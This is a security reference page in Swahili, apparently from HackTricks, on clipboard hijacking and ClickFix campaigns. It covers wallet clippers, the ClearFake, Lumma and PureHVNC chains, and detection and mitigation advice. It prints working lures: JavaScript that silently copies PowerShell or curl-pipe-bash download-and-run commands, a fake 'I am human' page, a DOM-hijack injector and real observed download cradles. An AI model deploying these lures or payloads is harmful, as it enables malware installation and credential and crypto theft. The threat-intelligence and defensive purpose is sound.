# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Usibandike kamwe kitu ambacho hukukinakili mwenyewe." – ushauri wa zamani lakini bado ni halali

## Muhtasari

Clipboard hijacking – inayojulikana pia kama *pastejacking* – hutumia ukweli kwamba watumiaji hunakili na kubandika amri mara kwa mara bila kuzichunguza. Ukurasa hasidi wa wavuti (au muktadha wowote unaoweza kutumia JavaScript, kama vile programu ya Electron au Desktop) huweka kimyakimya maandishi yanayodhibitiwa na mshambuliaji kwenye clipboard ya mfumo. Waathiriwa huhimizwa, kwa kawaida kupitia maagizo ya uhandisi-jamii yaliyoundwa kwa makini, kubonyeza **Win + R** (kisanduku cha Run), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *kubandika* maudhui ya clipboard, na hivyo kutekeleza amri kiholela mara moja.

Kwa kuwa **hakuna faili inayopakuliwa na hakuna kiambatisho kinachofunguliwa**, mbinu hii hukwepa vidhibiti vingi vya usalama vya barua pepe na maudhui ya wavuti vinavyofuatilia viambatisho, macros au utekelezaji wa amri wa moja kwa moja. Kwa hiyo, shambulizi hili ni maarufu katika kampeni za phishing zinazosambaza familia za malware za kawaida kama vile NetSupport RAT, Latrodectus loader au Lumma Stealer.<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

Aina nyingine ya **clipboard hijacking** haibandiki amri kabisa: husubiri hadi mwathiriwa anapokili **anwani ya cryptocurrency wallet**, kisha hubadilisha anwani hiyo kimyakimya na kuweka anwani inayodhibitiwa na mshambuliaji kabla tu ya kubandika. Hili hufanya kazi vizuri hasa kwa miundo mirefu ya wallet kwa sababu watumiaji mara nyingi hukagua herufi za mwanzo/mwisho pekee.<sup>[[8]](#references)</sup>

Sifa za kawaida zinazoonekana katika matukio halisi:
- **Thin loader + nested payload**: programu/exe inayoonekana hufanana na zana halali ya biashara au ya "faida", huku clipper halisi ikiwa imefichwa ndani zaidi ya kifurushi (kwa mfano .NET loader inayozindua Rust payload iliyopachikwa ndani yake).
- **Regex-driven replacement**: malware hutafuta mifuatano kama `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, au hata mifuatano ya jumla inayofanana na ya Solana yenye **herufi 44**, kisha huiandika upya na kuweka wallet za mshambuliaji.
- **Wallet rotation at scale**: sampuli za kisasa za Windows zinaweza kupachika wallet **maelfu** za kubadilishia kwa kila sarafu badala ya anwani moja isiyobadilika, hivyo kupunguza kuharibika kwa sifa ya wallet baada ya kila wizi.<sup>[[8]](#references)</sup>

### Windows clipper flow

Utekelezaji wa kawaida ni dirisha lililofichwa lililosajiliwa kwa **`AddClipboardFormatListener`**. Kila clipboard inaposasishwa, malware kwa kawaida huita:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → kufikia data ya sasa ya clipboard.
- **`GetClipboardData`** → kusoma maandishi.
- **`EmptyClipboard`** + **`SetClipboardData`** → kubadilisha mfuatano wa wallet na thamani ya mshambuliaji.

Regex ndogo za kutafuta zinazopatikana mara nyingi kwenye clippers:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

Persistence ya kiwango cha mtumiaji inatosha kuleta athari. Mfano mmoja ulioonekana ni:<sup>[[8]](#references)</sup>
- Nakili payload hadi **`%APPDATA%\silke\silke.exe`**
- Unda **LNK ya Startup-folder** ndani ya `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Mawazo ya ugunduzi:
- Michakato inayoita clipboard APIs mfululizo huku pia ikiandika ndani ya `%APPDATA%` na folda ya mtumiaji ya **Startup**.
- Uundaji mpya wa LNK/executable unaofuatwa na kubadilishwa upya kwa anwani za wallet kwenye clipboard.
- Archives au vifurushi vya programu bandia vilivyo na faili nyingi zisizotumika pamoja na launcher ndogo inayoanzisha binary iliyofichwa ndani ya folda nyingine.

### Kuondoa quarantine kwa hila za kijamii kwenye macOS + persistence ya LaunchAgent

Kwenye macOS, baadhi ya kampeni husambaza helper ya **`unlocker.command`** na kumwelekeza mwathiriwa kubofya kulia → **Open** ikiwa Gatekeeper itasema programu imeharibika au imetoka kwa msanidi programu asiyejulikana. Script hiyo huondoa tu quarantine na kuzindua `.app` iliyo karibu nayo:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Hii **si** exploit ya Gatekeeper; ni **njia ya kupita quarantine kwa kutumia uhandisi wa kijamii** inayotumia ukweli kwamba maamuzi ya Gatekeeper hutegemea xattr ya `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Baada ya kutekelezwa, clipper inaweza kujidumisha kama mtumiaji wa sasa kwa kuandika:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script ya wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent yenye `RunAtLoad` na `KeepAlive`

Jambo muhimu kwa ulinzi ni kwamba baadhi ya sampuli hutumia **watchdog inayojirekebisha** na kuandika upya LaunchAgent na wrapper takriban kila sekunde 30. Ukiondoa plist kwanza **bila kuua mchakato unaoendelea**, malware inaweza kuunda tena mara moja.<sup>[[8]](#references)</sup> Mpangilio salama wa usafishaji:
1. Ua mchakato wa clipper unaotumika.
2. Ondoa kwenye mfumo/futa plist ya LaunchAgent.
3. Futa `~/launch.sh` na payload iliyonakiliwa.

### Maelezo ya usambazaji: sifa bandia kama kizidishi cha nguvu

Kwa familia hii, malware yenyewe inaweza kubaki rahisi kitaalamu huku **tabaka la usambazaji** likifanya kazi kubwa: stars/forks bandia za GitHub, reviews/downloads za SourceForge, maoni/mitazamo ya mafunzo ya YouTube, na maoni/kura zinazoonekana zisizo na madhara za VirusTotal hutumiwa kufanya binary ionekane ya kuaminika kabla ya kutekelezwa.<sup>[[8]](#references)</sup>

## Vitufe vya kulazimisha kunakili na payload zilizofichwa (amri za macOS za mstari mmoja)

Baadhi ya infostealer za macOS huiga tovuti za visakinishi (k.m., Homebrew) na **kulazimisha matumizi ya kitufe cha “Copy”** ili watumiaji wasiweze kuteua maandishi yanayoonekana pekee. Maudhui ya clipboard huwa na amri inayotarajiwa ya kusakinisha pamoja na payload ya Base64 iliyoongezwa (k.m., `...; echo <b64> | base64 -d | sh`), kwa hiyo kubandika mara moja hutekeleza vyote viwili huku UI ikificha hatua ya ziada.<sup>[[5]](#references)</sup>

## Uthibitisho wa Dhana ya JavaScript

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Kampeni za zamani zilitumia `document.execCommand('copy')`, huku mpya zikitumia **Clipboard API** ya asynchronous (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Mtiririko wa ClickFix / ClearFake

1. Mtumiaji hutembelea tovuti yenye jina linalofanana kimakosa na tovuti halisi au tovuti iliyohujumiwa (kwa mfano, `docusign.sa[.]com`)
2. JavaScript ya **ClearFake** iliyoingizwa huita helper ya `unsecuredCopyToClipboard()` ambayo huhifadhi kimyakimya amri fupi ya PowerShell iliyosimbwa kwa Base64 kwenye clipboard.
3. Maagizo ya HTML humwambia mwathiriwa: *“Bonyeza **Win + R**, bandika amri kisha ubonyeze Enter ili kutatua tatizo.”*
4. `powershell.exe` hutekelezwa na kupakua archive iliyo na executable halali pamoja na DLL hasidi (mbinu ya kawaida ya DLL sideloading).
5. Loader husimbua hatua za ziada, huingiza shellcode na kusakinisha persistence (kwa mfano, scheduled task) – na hatimaye kuendesha NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Mlolongo wa Mfano wa NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (Java WebStart halali) hutafuta `msvcp140.dll` kwenye saraka yake.
* DLL hasidi hutafuta API kwa nguvu kwa kutumia **GetProcAddress**, hupakua faili mbili za binary (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, huzifungua kwa kutumia ufunguo wa XOR unaobadilika `"https://google.com/"`, huingiza shellcode ya mwisho na kutoa **client32.exe** (NetSupport RAT) kwenye `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Inapakua `la.txt` kwa kutumia **curl.exe**
2. Inaendesha JScript downloader ndani ya **cscript.exe**
3. Inapata MSI payload → inaweka `libcef.dll` kando ya signed application → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer kupitia MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Wito wa **mshta** huzindua script ya PowerShell iliyofichwa inayopakua `PartyContinued.exe`, kutoa `Boat.pst` (CAB), kuunda upya `AutoIt3.exe` kupitia `extrac32` na kuunganisha faili, kisha kuendesha script ya `.a3x` inayotoa credentials za browser kwenda `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK yenye C2 inayobadilika (PureHVNC)

Baadhi ya kampeni za ClickFix huruka kabisa upakuaji wa faili na badala yake huwaelekeza waathiriwa kubandika mstari mmoja unaopakua na kutekeleza JavaScript kupitia WSH, kuihifadhi ili idumu, na kubadilisha C2 kila siku. Mlolongo wa mfano ulioonekana:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Sifa kuu
- URL iliyofichwa hubadilishwa mpangilio wakati wa utekelezaji ili kuzuia ukaguzi wa kawaida.
- JavaScript hujiendeleza kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa — hivyo kuwezesha kubadilisha domain kwa haraka.<sup>[[3]](#references)</sup>

Kipande kidogo cha JS kinachotumika kubadilisha C2 kulingana na tarehe:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Hatua inayofuata mara nyingi hutumia loader inayoweka persistence na kupakua RAT (kwa mfano, PureHVNC), mara nyingi ikiweka TLS ifungamane na cheti kilichowekwa hardcode na kugawa trafiki katika vipande.<sup>[[3]](#references)</sup>

Mawazo ya utambuzi mahususi kwa variant hii
- Mti wa michakato: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (au `cscript.exe`).
- Mabaki ya uanzishaji: LNK katika `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` inayoanzisha WScript/CScript kwa kutumia njia ya JS chini ya `%TEMP%`/`%APPDATA%`.
- Telemetry ya Registry/RunMRU na command line yenye `.split('').reverse().join('')` au `eval(a.responseText)`.
- Amri zinazorudiwa za `powershell -NoProfile -NonInteractive -Command -` zenye payload kubwa za stdin, ili kuingiza scripts ndefu bila kutumia command line ndefu.
- Scheduled Tasks zinazotekeleza baadaye LOLBins kama `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` chini ya task/njia inayoonekana kama ya updater (kwa mfano, `\GoogleSystem\GoogleUpdater`).

Uwindaji wa vitisho
- Majina ya host ya C2 na URLs zinazobadilika kila siku na kufuata muundo wa `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Linganisha matukio ya uandishi wa clipboard yanayofuatwa na kubandika kupitia Win+R kisha utekelezaji wa haraka wa `powershell.exe`.

Timu za Blue team zinaweza kuunganisha telemetry ya clipboard, uundaji wa michakato na Registry ili kubaini matumizi mabaya ya pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` huhifadhi historia ya amri za **Win + R** – tafuta maingizo yasiyo ya kawaida ya Base64 / yaliyofichwa.
* Security Event ID **4688** (Process Creation) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` ni mojawapo ya { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** ya uundaji wa faili chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au folda za muda kabla tu ya tukio la kutiliwa shaka la 4688.
* Vihisi vya clipboard vya EDR (ikiwa vipo) – linganisha `Clipboard Write` inayofuatwa mara moja na mchakato mpya wa PowerShell.

## Kurasa za uthibitishaji za mtindo wa IUAM (ClickFix Generator): kunakili kutoka clipboard hadi console + payloads zinazozingatia OS

Kampeni za hivi majuzi huzalisha kwa wingi kurasa bandia za uthibitishaji wa CDN/browser ("Just a moment…", za mtindo wa IUAM) zinazowashawishi watumiaji kunakili amri mahususi kwa OS kutoka kwenye clipboard na kuziweka kwenye consoles asilia. Hii huhamisha utekelezaji nje ya sandbox ya browser na hufanya kazi kwenye Windows na macOS.<sup>[[4]](#references)</sup>

Sifa kuu za kurasa zilizozalishwa na builder
- Utambuzi wa OS kupitia `navigator.userAgent` ili kurekebisha payloads (Windows PowerShell/CMD dhidi ya macOS Terminal). Decoys/no-ops za hiari kwa OS zisizotumika ili kudumisha udanganyifu.
- Kunakili clipboard kiotomatiki kupitia vitendo visivyo hasidi vya UI (checkbox/Copy), huku maandishi yanayoonekana yakiwa yanaweza kutofautiana na yaliyomo kwenye clipboard.
- Kuzuia vifaa vya mkononi na popover yenye maelekezo ya hatua kwa hatua: Windows → Win+R→paste→Enter; macOS → fungua Terminal→paste→Enter.
- Obfuscation ya hiari na injector ya faili moja ya kubadilisha DOM ya tovuti iliyoathiriwa na UI ya uthibitishaji iliyopambwa kwa Tailwind (hakuna haja ya kusajili domain mpya).<sup>[[4]](#references)</sup>

Mfano: kutolingana kwa clipboard + matawi yanayozingatia OS
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS persistence ya uendeshaji wa awali
- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, na kupunguza mabaki yanayoonekana.<sup>[[4]](#references)</sup>

Utekaji wa ukurasa kwenye tovuti zilizoathiriwa
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Mawazo ya ugunduzi na hunting mahususi kwa chambo cha mtindo wa IUAM
- Web: Kurasa zinazounganisha Clipboard API na verification widgets; tofauti kati ya maandishi yanayoonyeshwa na payload ya clipboard; kubadilisha tabia kulingana na `navigator.userAgent`; Tailwind + single-page replace katika mazingira yanayotiliwa shaka.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` muda mfupi baada ya mwingiliano na browser; installers za batch/MSI zinazoendeshwa kutoka `%TEMP%`.
- macOS endpoint: Terminal/iTerm ikianzisha `bash`/`curl`/`base64 -d` pamoja na `nohup` karibu na matukio ya browser; kazi za chinichini zinazoendelea baada ya terminal kufungwa.
- Linganisha historia ya `RunMRU` Win+R na maandishi yanayoandikwa kwenye clipboard na uanzishwaji unaofuata wa console process.

Tazama pia mbinu zinazounga mkono

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mageuzi ya fake CAPTCHA / ClickFix ya 2026 (ClearFake, Scarlet Goldfinch)

- ClearFake inaendelea kuhatarisha tovuti za WordPress na kuingiza loader JavaScript inayounganisha hosts za nje (Cloudflare Workers, GitHub/jsDelivr) na hata kuita blockchain “etherhiding” (kwa mfano, POSTs kwenda kwenye API endpoints za Binance Smart Chain kama `bsc-testnet.drpc[.]org`) ili kupata logic ya sasa ya chambo. Overlays za hivi karibuni zinatumia sana fake CAPTCHA zinazowaelekeza watumiaji kunakili/kubandika amri ya mstari mmoja (T1204.004) badala ya kupakua chochote.<sup>[[6]](#references)</sup>
- Utekelezaji wa awali unazidi kukabidhiwa kwa signed script hosts/LOLBAS. Msururu wa Januari 2026 uliacha kutumia `mshta` kama hapo awali na badala yake ukatumia `SyncAppvPublishingServer.vbs` iliyojengewa ndani, ikiendeshwa kupitia `WScript.exe`, na kupitishiwa hoja zinazofanana na PowerShell zenye aliases/wildcards ili kupata maudhui ya mbali:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` imesainiwa na kwa kawaida hutumiwa na App-V; ikiunganishwa na `WScript.exe` na hoja zisizo za kawaida (majina ya mkato `gal`/`gcm`, cmdlets zenye wildcard, URL za jsDelivr) huwa hatua ya LOLBAS yenye ishara wazi kwa ClearFake.<sup>[[6]](#references)</sup>
- Payload za CAPTCHA bandia za Februari 2026 zilirudi kwenye download cradles za PowerShell pekee. Mifano miwili inayopatikana sasa:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Mnyororo wa kwanza ni grabber ya `iex(irm ...)` inayofanya kazi kwenye memory; wa pili huandaa hatua kupitia `WinHttp.WinHttpRequest.5.1`, huandika faili ya muda ya `.ps1`, kisha huizindua kwa `-ep bypass` kwenye dirisha lililofichwa.<sup>[[6]](#references)</sup>

Vidokezo vya detection/hunting kwa matoleo haya
- Mfuatano wa michakato: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` au PowerShell cradles mara tu baada ya maandishi kunakiliwa kwenye clipboard/Win+R.
- Maneno muhimu kwenye command line: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domains za jsDelivr/GitHub/Cloudflare Worker, au mifumo ya raw IP `iex(irm ...)`.
- Mtandao: miunganisho ya nje kwenda kwa hosts za CDN worker au blockchain RPC kutoka kwa script hosts/PowerShell muda mfupi baada ya kuvinjari wavuti.
- Faili/registry: kuundwa kwa `.ps1` ya muda chini ya `%TEMP%` pamoja na maingizo ya RunMRU yenye one-liners hizi; zuia/toa tahadhari kuhusu signed-script LOLBAS (WScript/cscript/mshta) zinazoendeshwa na external URLs au mifuatano ya alias iliyofichwa.

## Mbinu za ClickFix za Juni 2026: telemetry ya kubandika, maoni bandia ya uthibitishaji, na uunganishaji wa LOLBin

Telemetry ya hivi majuzi ya Red Canary inaonyesha kuwa kiashiria thabiti **si amri moja mahususi**, bali ni mchanganyiko wa **kubandika na kuendesha kwa msaada wa mtumiaji**, **interpreters/LOLBins zinazoaminika**, **flags zilizofichwa**, **upakuaji wa mbali**, na **utekelezaji wa mara moja**.<sup>[[7]](#references)</sup>

### Miundo mashuhuri ya waendeshaji

- **Telemetry ya kuthibitisha kubandika**: baadhi ya payloads huita `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` kabla ya hatua halisi. Hii huthibitisha mwingiliano wa mtumiaji huku dirisha likiwa fupi na lisiloonekana sana.
- **Maoni bandia ya uthibitishaji**: one-liners za PowerShell zinaweza kuongeza mifuatano kama `# Security check ✔️ I'm not a robot Verification ID: 138105` ili amri iendelee kuonekana inahusiana na CAPTCHA baada ya kubandikwa kwenye Run / historia ya `cmd.exe` / PowerShell.
- **Uundaji upya wa URL kwa nguvu**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` huepuka kuweka URL tuli kwenye command line huku ikiendelea kupakua na kutekeleza ndani ya memory.
- **Utekelezaji wa installer iliyojifananisha**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` hutumia herufi kubwa na ndogo zisizo za kawaida pamoja na herufi zinazofanana na Unicode kwenye flags ili kuvuruga detections zisizonyumbulika huku bado ikifanana na `msiexec.exe`.
- **Minyororo ya LOLBin yenye caret escapes**: `cmd.exe` inaweza kuficha maneno muhimu kwa kutumia `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), kuanzisha shell ya ndani ikiwa imepunguzwa, kuhifadhi maudhui ya mshambulizi kwa kiendelezi kinachoonekana salama kama `.pdf`, kisha kulitekeleza kupitia `mshta`.<sup>[[7]](#references)</sup>
## Hatua za kupunguza hatari

1. Kuimarisha browser – zima ruhusa ya kuandika kwenye clipboard (`dom.events.asyncClipboard.clipboardItem` n.k.) au hitaji ishara ya mtumiaji.
2. Uhamasishaji wa usalama – wafundishe watumiaji *kuandika* amri nyeti au kuibandika kwanza kwenye kihariri maandishi.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuzuia one-liners zisizoidhinishwa.
4. Udhibiti wa mtandao – zuia maombi ya nje kwenda kwa domains zinazojulikana za pastejacking na malware C2.

## Ujanja Unaohusiana

* **Utekaji wa Discord Invite** mara nyingi hutumia mbinu hiyo hiyo ya ClickFix baada ya kuwanasa watumiaji kwenye server hasidi:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Rekebisha Click: Kuzuia Njia ya Mashambulizi ya ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Chini ya Pazia Safi: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Kiwanda cha ClickFix: Ufichuzi wa Kwanza wa Jenereta ya IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Maarifa ya Ujasusi: Februari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Maarifa ya Ujasusi: Juni 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Kutoka Stars hadi Upvotes: Sifa Bandia Zinazochochea Mtekaji wa Clipboard ya Crypto](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
